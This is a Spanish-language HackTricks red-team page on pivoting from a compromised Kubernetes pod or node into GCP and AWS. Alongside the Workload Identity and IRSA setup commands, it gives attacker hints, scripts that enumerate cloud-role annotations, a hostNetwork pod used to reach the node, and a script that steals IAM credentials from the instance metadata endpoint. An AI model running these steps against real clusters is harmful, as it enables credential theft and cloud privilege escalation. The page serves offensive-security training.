# Kubernetes Pivoting to Clouds

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCP

Si est치s ejecutando un cl칰ster de k8s dentro de GCP, probablemente querr치s que alguna aplicaci칩n que se ejecute dentro del cl칰ster tenga acceso a GCP. Hay 2 formas comunes de hacerlo:

### Montando claves de GCP-SA como secreto

Una forma com칰n de dar **acceso a una aplicaci칩n de kubernetes a GCP** es:

* Crear una Cuenta de Servicio de GCP
* Asignarle los permisos deseados
* Descargar una clave json de la SA creada
* Montarla como un secreto dentro del pod
* Establecer la variable de entorno GOOGLE\_APPLICATION\_CREDENTIALS apuntando a la ruta donde se encuentra el json.

{% hint style="warning" %}
Por lo tanto, como **atacante**, si comprometes un contenedor dentro de un pod, deber칤as verificar esa **variable** **env** y los **archivos** **json** con credenciales de GCP.
{% endhint %}

### Relacionando json de GSA a secreto de KSA

Una forma de dar acceso a un GSA a un cl칰ster de GKE es vincul치ndolos de esta manera:

* Crea una cuenta de servicio de Kubernetes en el mismo espacio de nombres que tu cl칰ster de GKE usando el siguiente comando:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Crea un Secret de Kubernetes que contenga las credenciales de la cuenta de servicio de GCP a la que deseas otorgar acceso al cl칰ster de GKE. Puedes hacer esto utilizando la herramienta de l칤nea de comandos `gcloud`, como se muestra en el siguiente ejemplo:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Vincula el Secreto de Kubernetes a la cuenta de servicio de Kubernetes utilizando el siguiente comando:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
En el **segundo paso** se configuraron las **credenciales de la GSA como secreto de la KSA**. Entonces, si puedes **leer ese secreto** desde **dentro** del **cl칰ster GKE**, puedes **escalar a esa cuenta de servicio de GCP**.
{% endhint %}

### Identidad de Carga de Trabajo en GKE

Con la Identidad de Carga de Trabajo, podemos configurar una [cuenta de servicio de Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) para actuar como una [cuenta de servicio de Google](https://cloud.google.com/iam/docs/understanding-service-accounts). Los Pods que se ejecutan con la cuenta de servicio de Kubernetes se autenticar치n autom치ticamente como la cuenta de servicio de Google al acceder a las API de Google Cloud.

La **primera serie de pasos** para habilitar este comportamiento es **habilitar la Identidad de Carga de Trabajo en GCP** ([**pasos**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) y crear la SA de GCP que deseas que k8s imite.

* **Habilitar la Identidad de Carga de Trabajo** en un nuevo cl칰ster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Crear/Actualizar un nuevo nodepool** (los cl칰steres Autopilot no necesitan esto)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Crea la **Cuenta de Servicio de GCP para suplantar** desde K8s con permisos de GCP:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Con칠ctese** al **cl칰ster** y **cree** la **cuenta de servicio** para usar

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Vincular el GSA con el KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* Ejecuta un **pod** con el **KSA** y verifica el **acceso** al **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
Verifique el siguiente comando para autenticar en caso de ser necesario:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
Como atacante dentro de K8s, deber칤as **buscar SAs** con la **anotaci칩n `iam.gke.io/gcp-service-account`** ya que eso indica que el SA puede acceder a algo en GCP. Otra opci칩n ser칤a intentar abusar de cada KSA en el cl칰ster y verificar si tiene acceso.\
Desde GCP, siempre es interesante enumerar los bindings y saber **qu칠 acceso est치s otorgando a SAs dentro de Kubernetes**.
{% endhint %}

Este es un script para **iterar f치cilmente sobre todas las definiciones de pods** **buscando** esa **anotaci칩n**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (rol IAM para Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Una forma (desactualizada) de otorgar roles IAM a los Pods es usar un [**Kiam**](https://github.com/uswitch/kiam) o un [**Kube2IAM**](https://github.com/jtblin/kube2iam) **servidor.** B치sicamente, necesitar치s ejecutar un **daemonset** en tu cl칰ster con un **tipo de rol IAM privilegiado**. Este daemonset ser치 el que otorgue acceso a los roles IAM a los pods que lo necesiten.

Primero que nada, necesitas configurar **qu칠 roles pueden ser accedidos dentro del namespace**, y lo haces con una anotaci칩n dentro del objeto namespace:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Una vez que el espacio de nombres est치 configurado con los roles de IAM que los Pods pueden tener, puedes **indicar el rol que deseas en cada definici칩n de pod con algo como**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
Como atacante, si **encuentras estas anotaciones** en pods o namespaces o un servidor kiam/kube2iam en ejecuci칩n (probablemente en kube-system) puedes **suplantar cada r**ol que ya est치 **usado por pods** y m치s (si tienes acceso a la cuenta de AWS, enumera los roles).
{% endhint %}

#### Crear Pod con Rol IAM

{% hint style="info" %}
El rol IAM que se debe indicar debe estar en la misma cuenta de AWS que el rol kiam/kube2iam y ese rol debe poder acceder a 칠l.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Role for K8s Service Accounts via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Esta es la **manera recomendada por AWS**.

1. Primero que nada, necesitas [crear un proveedor OIDC para el cl칰ster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Luego, creas un rol IAM con los permisos que el SA requerir치.
3. Crea una [relaci칩n de confianza entre el rol IAM y el SA](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) nombre (o los namespaces que dan acceso al rol a todos los SAs del namespace). _La relaci칩n de confianza principalmente verificar치 el nombre del proveedor OIDC, el nombre del namespace y el nombre del SA_.
4. Finalmente, **crea un SA con una anotaci칩n que indique el ARN del rol**, y los pods que se ejecuten con ese SA tendr치n **acceso al token del rol**. El **token** est치 **escrito** dentro de un archivo y la ruta se especifica en **`AWS_WEB_IDENTITY_TOKEN_FILE`** (predeterminado: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Para **obtener aws usando el token** de `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`, ejecuta:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
Como atacante, si puedes enumerar un cl칰ster de K8s, verifica las **cuentas de servicio con esa anotaci칩n** para **escalar a AWS**. Para hacerlo, simplemente **exec/create** un **pod** utilizando una de las **cuentas de servicio privilegiadas de IAM** y roba el token.

Adem치s, si est치s dentro de un pod, verifica las variables de entorno como **AWS\_ROLE\_ARN** y **AWS\_WEB\_IDENTITY\_TOKEN.**
{% endhint %}

{% hint style="danger" %}
A veces, la **Pol칤tica de Confianza de un rol** puede estar **mal configurada** y en lugar de dar acceso a AssumeRole a la cuenta de servicio esperada, se lo da a **todas las cuentas de servicio**. Por lo tanto, si eres capaz de escribir una anotaci칩n en una cuenta de servicio controlada, puedes acceder al rol.

Consulta la **siguiente p치gina para m치s informaci칩n**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Encontrar Pods y Cuentas de Servicio con Roles de IAM en el Cl칰ster

Este es un script para **iterar f치cilmente sobre todos los pods y definiciones de cuentas de servicio** **buscando** esa **anotaci칩n**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Node IAM Role

La secci칩n anterior trataba sobre c칩mo robar roles de IAM con pods, pero ten en cuenta que un **Nodo del** cl칰ster K8s va a ser una **instancia dentro de la nube**. Esto significa que es muy probable que el Nodo **tenga un nuevo rol de IAM que puedes robar** (_ten en cuenta que, por lo general, todos los nodos de un cl칰ster K8s tendr치n el mismo rol de IAM, por lo que puede que no valga la pena intentar verificar en cada nodo_).

Sin embargo, hay un requisito importante para acceder al endpoint de metadatos desde el nodo, necesitas estar en el nodo (쯥esi칩n ssh?) o al menos tener la misma red:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Robar el Token de Rol IAM

Anteriormente hemos discutido c칩mo **adjuntar Roles IAM a Pods** o incluso c칩mo **escapar al Nodo para robar el Rol IAM** que la instancia tiene adjunto.

Puedes usar el siguiente script para **robar** tus nuevas y arduamente trabajadas **credenciales de rol IAM**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Referencias

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
